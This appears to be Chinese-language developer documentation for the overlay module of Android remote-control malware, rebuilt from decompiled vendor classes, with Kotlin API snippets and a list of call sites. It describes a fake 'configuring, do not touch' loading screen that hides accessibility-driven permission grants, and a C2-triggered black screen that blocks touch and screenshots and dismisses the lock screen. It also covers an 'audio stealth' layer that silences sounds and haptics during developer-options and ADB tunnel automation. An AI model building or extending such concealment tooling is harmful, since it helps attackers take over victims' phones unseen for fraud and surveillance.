# 遮罩模块 API 文档

> **模块路径**: `service/modules/overlay/`
> **创建日期**: 2026-04-22
> **Vendor 来源**: C0763km (ConfigMaskManager) + C0708j7 (MaskOverlay) + dd0 (MaskConfig) + RunnableC0707j6 (ProgressAnimator)

---

## 一、模块概述

统一的全屏遮罩模块，基于 `WindowManager TYPE_ACCESSIBILITY_OVERLAY` 实现。通过传入不同的 `OverlayConfig` 配置，一套代码实现两种遮罩效果：

| 场景 | 效果 | 工厂方法 |
|------|------|---------|
| 初始化配置遮罩 | 黑色背景 + APP 图标 + 蓝色渐变进度条 + 文字轮播 + 触摸穿透 | `OverlayConfig.configMask()` |
| C2 黑屏命令 | 纯黑背景 + 触摸拦截 + 禁止截屏 | `OverlayConfig.blackScreen()` |

### 三层隐蔽机制

| 层 | 组件 | 作用 |
|---|------|------|
| 第一层 | `OverlayManager` | 全屏视觉遮罩（覆盖所有窗口） |
| 第二层 | `AudioStealthManager` | 5 路音频流静音 + 铃声静默 |
| 第三层 | `AudioStealthManager` | 禁用触觉反馈 |

---

## 二、文件结构

```
service/modules/overlay/
├── OverlayConfig.kt            # 配置数据类（85 行）
├── OverlayManager.kt           # 门面：show/hide/updateProgress（113 行）
├── OverlayWindowView.kt        # UI 构建 + WindowManager 操作（260 行）
├── OverlayProgressAnimator.kt  # 双模式进度动画（110 行）
└── AudioStealthManager.kt      # 音频静音/恢复（143 行）
```

### 依赖关系

```
调用方（MyAccessibilityService / BlackScreenCommandHandler / ...）
    │
    ├─ OverlayManager ──── OverlayWindowView ──── OverlayConfig
    │       │                                         │
    │       └──── OverlayProgressAnimator ────────────┘
    │
    └─ AudioStealthManager（独立，无 overlay 依赖）
```

---

## 三、快速接入指南

### 3.1 获取实例

`OverlayManager` 和 `AudioStealthManager` 由 `MyAccessibilityService` 在 `initializeManagers()` 中创建并持有：

```kotlin
// MyAccessibilityService.kt
var overlayManager: OverlayManager? = null  // line 320

// initializeManagers() 中:
overlayManager = OverlayManager(this)
```

子模块通过 `service` 引用访问：

```kotlin
// 方式 1：直接通过 service 引用
val service = context as? MyAccessibilityService
service?.overlayManager?.show()

// 方式 2：构造函数注入（推荐）
class YourHandler(
    private val overlayManager: OverlayManager
) {
    fun doSomething() {
        overlayManager.show()
    }
}
```

`AudioStealthManager` 可独立创建（无需 AccessibilityService）：

```kotlin
val audioStealth = AudioStealthManager(context)
```

---

## 四、OverlayManager API

### 4.1 show — 显示遮罩

```kotlin
fun show(config: OverlayConfig = OverlayConfig.configMask())
```

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `config` | `OverlayConfig` | `OverlayConfig.configMask()` | 遮罩配置 |

**行为规则:**

| 当前状态 | 行为 |
|---------|------|
| 未显示 | 构建 View → addView → 启动进度动画 |
| 已显示 | 就地更新 WindowManager flags（不重建 View） |
| addView 失败 | 自动指数退避重试 5 次（200ms → 3000ms） |
| 非主线程调用 | 自动 post 到主线程执行 |

### 4.2 hide — 隐藏遮罩

```kotlin
fun hide()
```

**行为:** 停止动画 → removeView → 释放 bitmap → 清空引用。未显示时为 no-op。线程安全。

### 4.3 isShowing — 查询状态

```kotlin
val isShowing: Boolean  // @Volatile, 线程安全读取
```

### 4.4 updateProgress — 外部推进进度

```kotlin
fun updateProgress(percent: Int, message: String? = null)
```

供 `ConfigProgressManager` 等外部组件推进进度条。跳过自动动画时间线，直接设定百分比和文本。

### 4.5 dispose — 清理

```kotlin
fun dispose()
```

在 `AccessibilityService.onDestroy()` 中调用。内部调用 `hide()`。

---

## 五、OverlayConfig 配置详解

### 5.1 完整字段

```kotlin
data class OverlayConfig(
    val background: OverlayBackground = OverlayBackground.Image(),  // 背景
    val touchMode: TouchMode = TouchMode.PASSTHROUGH,                // 触摸行为
    val preventScreenshot: Boolean = false,                          // 禁止截屏
    val showAppIcon: Boolean = true,                                 // 显示 APP 图标
    val progressBar: ProgressBarStyle = ProgressBarStyle.GradientBlue(), // 进度条样式
    val titleText: String = "配置中请稍后...",                        // 底部主文本
    val subtitleText: String = "正在自动配置和连接\n请勿操作设备",     // 底部副标题
    val statusText: String = "配置完成后将自动返回应用",              // 底部状态
    val titleColor: String = "#FFFFFF",                              // 主文本颜色
    val subtitleColor: String = "#CCCCCC",                           // 副标题颜色
    val loadingTips: List<String> = DEFAULT_TIPS,                    // 提示轮播列表
    val keepScreenOn: Boolean = true,                                // 屏幕常亮
)
```

### 5.2 TouchMode — 触摸模式

```kotlin
enum class TouchMode {
    PASSTHROUGH,  // FLAG_NOT_TOUCHABLE — 触摸穿透到下层（自动化点击穿透）
    INTERCEPT     // 消费触摸 — 阻止用户操作
}
```

### 5.3 OverlayBackground — 背景类型

```kotlin
sealed interface OverlayBackground {
    // 纯色背景
    data class SolidColor(
        val color: Int = Color.BLACK,  // 颜色值
        val alpha: Float = 1f          // 透明度 0.0~1.0
    ) : OverlayBackground

    // 图片背景（带优先级链回退）
    data class Image(
        val assetPaths: List<String> = listOf("app_loading_bg.webp", "app_loading_bg.png"),
        val fallbackDrawable: String? = "bg_config_mask",
        val fallbackColor: Int = Color.BLACK
    ) : OverlayBackground
}
```

**Image 加载优先级:** `assetPaths[0]` → `assetPaths[1]` → `fallbackDrawable` → `fallbackColor`

### 5.4 ProgressBarStyle — 进度条样式

```kotlin
sealed interface ProgressBarStyle {
    data object None : ProgressBarStyle  // 不显示进度条

    data class GradientBlue(             // 蓝色渐变（vendor 配置遮罩样式）
        val startColor: Int = 0xFF4A90D9.toInt(),
        val endColor: Int = 0xFF67B8F7.toInt(),
        val startFromMax: Boolean = false // true=从 80% 开始
    ) : ProgressBarStyle

    data class SystemOrange(             // 橙色纯色（vendor Activity 遮罩样式）
        val color: Int = 0xFFFF9800.toInt(),
        val startFromMax: Boolean = false
    ) : ProgressBarStyle
}
```

**进度动画行为:**

| startFromMax | 模式 | 时间线 |
|-------------|------|--------|
| `false` | 模式 B（首次配置） | 0→80%（30s，每 1s 更新）→ 80→95%（每 3s +1%）→ 停滞 |
| `true` | 模式 A（恢复） | 80→100%（60s 匀速） |

### 5.5 工厂方法

#### `configMask()` — 标准配置遮罩

```kotlin
OverlayConfig.configMask()
// 等价于 OverlayConfig()（全默认值）
```

用途：初始化阶段，伪装成 APP 正常加载界面。

#### `blackScreen()` — C2 黑屏命令

```kotlin
OverlayConfig.blackScreen(
    text: String = "",            // 显示文本（可为空）
    alpha: Float = 0.99f,         // 背景透明度
    interceptTouch: Boolean = true // 是否拦截触摸
)
```

用途：远程命令触发的黑屏覆盖。

### 5.6 提示文本轮播

默认 5 条（来自 vendor `server_config.json` 硬编码默认值）：

```
progress  0-19%  → "检查最优线路中"
progress 20-39%  → "正在连接服务器..."
progress 40-59%  → "正在加载资源..."
progress 60-79%  → "正在初始化配置..."
progress 80-100% → "正在启动"
```

映射公式: `tipIndex = clamp(floor(progress / 100.0 × tipCount), 0, tipCount - 1)`

---

## 六、AudioStealthManager API

### 6.1 muteAll — 全通道静音

```kotlin
fun muteAll()
```

执行顺序:
1. 保存 5 路音频流原始音量 → 全部设为 0
2. 保存铃声模式 → 设为 `RINGER_MODE_SILENT`
3. 保存触觉反馈状态 → 设为 0（禁用）

**静音的 5 路音频流:**

| 顺序 | 常量值 | Android 常量 | 说明 |
|------|-------|-------------|------|
| 1 | 2 | `STREAM_VOICE_CALL` | 通话音量 |
| 2 | 5 | `STREAM_NOTIFICATION` | 通知音量 |
| 3 | 1 | `STREAM_RING` | 铃声音量 |
| 4 | 3 | `STREAM_MUSIC` | 媒体音量 |
| 5 | 4 | `STREAM_ALARM` | 闹钟音量 |

### 6.2 restoreAll — 恢复全部

```kotlin
fun restoreAll()
```

恢复 `muteAll()` 保存的所有原始值。清空 `savedVolumes`。设置 `isActive = false`。

### 6.3 forceRestoreDefaults — 兜底恢复

```kotlin
fun forceRestoreDefaults()
```

不依赖保存的原始值，直接恢复为默认:
- 铃声模式 → `RINGER_MODE_NORMAL`
- 触觉反馈 → `1`（启用）

用途：DEPLOY 成功后的兜底恢复，确保即使 `muteAll()` 未被调用，设备也不会保持静音。

### 6.4 isActive — 查询状态

```kotlin
val isActive: Boolean  // @Volatile
```

---

## 七、调用示例

### 7.1 初始化配置遮罩（权限流）

```kotlin
// MyAccessibilityService.startPermissionGrantFlow()

// 显示遮罩（一行搞定，全默认配置）
overlayManager?.show()

// 启动假进度广播
configProgressManager?.startConfig()

// ... 权限自动化执行 ...

// 授权完成后隐藏
overlayManager?.hide()
```

### 7.2 C2 黑屏命令

```kotlin
// BlackScreenCommandHandler.handleEnableBlackScreen()

val config = OverlayConfig.blackScreen(
    text = text,
    alpha = alpha / 255f,
    interceptTouch = true
)
service.overlayManager?.show(config)

// 关闭
service.overlayManager?.hide()
```

### 7.3 开发者选项自动化（静音）

```kotlin
// OpenDevelopmentDelegate init

val audioStealth = AudioStealthManager(context)
audioStealth.muteAll()

// ... 开发者选项自动化（静音状态下执行）...

// 完成后恢复
audioStealth.restoreAll()
```

### 7.4 ADB 部署完成兜底

```kotlin
// AdbTunnelCommandHandler

AudioStealthManager(context).forceRestoreDefaults()
```

### 7.5 ADB 配对完成兜底关闭

```kotlin
// PairFlowOrchestrator.handleComplete()

(service as? MyAccessibilityService)?.overlayManager?.hide()
```

### 7.6 自定义配置

```kotlin
// 自定义遮罩：无图标 + 橙色进度条 + 自定义文本
overlayManager?.show(OverlayConfig(
    showAppIcon = false,
    progressBar = OverlayConfig.ProgressBarStyle.SystemOrange(),
    titleText = "正在安装更新...",
    subtitleText = "请勿关闭设备",
    loadingTips = listOf("准备中", "安装中", "即将完成")
))

// 自定义遮罩：纯黑 + 半透明 + 触摸穿透
overlayManager?.show(OverlayConfig(
    background = OverlayConfig.OverlayBackground.SolidColor(alpha = 0.8f),
    touchMode = OverlayConfig.TouchMode.PASSTHROUGH,
    showAppIcon = false,
    progressBar = OverlayConfig.ProgressBarStyle.None,
    titleText = "",
    subtitleText = ""
))

// 运行时更新进度
overlayManager?.updateProgress(75, "正在注册设备...")
```

---

## 八、UI 布局参考

### 8.1 Config Mask 模式

```
┌────────────────────────────────────────┐
│           (全沉浸黑色背景)               │
│    (或 assets/app_loading_bg.webp)      │
│                                        │
│            [APP 图标 80dp]              │
│             APP 名称 18sp              │
│                                        │
│    ████░░░░░░░░░░░░░░  (蓝色渐变)       │
│      "检查最优线路中" 14sp              │
│                                        │
│                                        │
│        "配置中请稍后..." 16sp           │
│     "正在自动配置和连接                 │
│      请勿操作设备" 12sp                │
│    "配置完成后将自动返回应用" 12sp       │
└────────────────────────────────────────┘
```

### 8.2 Black Screen 模式

```
┌────────────────────────────────────────┐
│                                        │
│           (纯黑，alpha=0.99)            │
│                                        │
│         [自定义文本，如有]               │
│                                        │
│                                        │
└────────────────────────────────────────┘
```

### 8.3 WindowManager Flags

| Flag | 效果 |
|------|------|
| `FLAG_NOT_FOCUSABLE` | 不接收焦点（始终生效） |
| `FLAG_NOT_TOUCHABLE` | 触摸穿透（仅 PASSTHROUGH 模式） |
| `FLAG_SECURE` | 禁止截屏（仅 `preventScreenshot=true`） |
| `FLAG_KEEP_SCREEN_ON` | 屏幕常亮 |
| `FLAG_TURN_SCREEN_ON` | 点亮屏幕 |
| `FLAG_SHOW_WHEN_LOCKED` | 锁屏上方显示 |
| `FLAG_DISMISS_KEYGUARD` | 解除锁屏 |
| `FLAG_LAYOUT_IN_SCREEN` | 含状态栏布局 |
| `FLAG_LAYOUT_NO_LIMITS` | 无边界限制 |
| `FLAG_FULLSCREEN` | 全屏 |
| `FLAG_HARDWARE_ACCELERATED` | GPU 渲染 |

窗口类型: `TYPE_ACCESSIBILITY_OVERLAY` (2032)，SDK < 26 回退 `TYPE_PHONE` (2006)。

---

## 九、Vendor 映射表

| Vendor 类 | Replica 文件 | 说明 |
|-----------|-------------|------|
| `C0763km.java` (ConfigMaskManager) | `OverlayManager.kt` | show/hide 生命周期 |
| `C0708j7.java` (MaskOverlay) | `OverlayWindowView.kt` | UI 构建 + WindowManager |
| `RunnableC0707j6.java` | `OverlayProgressAnimator.kt` | 进度动画 |
| `dd0.java` (MaskConfig) | `OverlayConfig.kt` | 配置数据类 |
| `C0343a0.java:240-277` (mute inline) | `AudioStealthManager.kt` | 静音逻辑 |
| `C0358a0.java:869-897` (restore inline) | `AudioStealthManager.kt` | 恢复逻辑 |
| `yojggfhv.java` (Activity mask) | 已废弃 | 功能合并到 OverlayManager |
| `ConfigMaskOverlay.kt` (旧 stub) | 已删除 | 被 OverlayManager 替代 |

---

## 十、当前调用方一览

| 调用方 | 文件:行号 | 动作 | 配置 |
|--------|----------|------|------|
| `MyAccessibilityService` | :2678 | `overlayManager?.show()` | configMask（默认） |
| `MyAccessibilityService` | :2717 | `overlayManager?.show()` | configMask（默认） |
| `MyAccessibilityService` | :3907 | `overlayManager?.hide()` | — |
| `BlackScreenCommandHandler` | :101 | `overlayManager?.show(config)` | blackScreen |
| `BlackScreenCommandHandler` | :168 | `overlayManager?.hide()` | — |
| `PairFlowOrchestrator` | :561 | `overlayManager?.hide()` | — |
| `OpenDevelopmentDelegate` | init | `audioStealth.muteAll()` | — |
| `OpenDevelopmentDelegate` | :645 | `audioStealth.restoreAll()` | — |
| `AdbTunnelCommandHandler` | :156 | `forceRestoreDefaults()` | — |
